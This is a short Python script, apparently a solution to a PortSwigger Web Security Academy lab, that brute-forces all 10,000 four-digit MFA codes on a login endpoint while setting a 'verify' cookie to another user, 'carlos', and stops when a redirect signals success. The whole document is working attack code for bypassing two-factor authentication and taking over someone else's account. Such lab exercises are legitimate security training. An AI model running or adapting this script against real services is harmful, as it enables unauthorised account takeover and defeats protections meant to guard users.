import requests

URL = "https://0add00c103317f138216014a00b3006a.web-security-academy.net/login2"

cookies = {'verify': 'carlos', 'session': 'GCEDa82ChUv90OpfYU9eZvVZJib7f8hw'}

for code in range(10000):
    mfa_code = f"{code:04d}"
    data = {'mfa-code': mfa_code}
    
    response = requests.post(URL, cookies=cookies, data=data)
    
    if response.status_code == 302:
        print("Code MFA utilisé avec succès :", mfa_code)
        break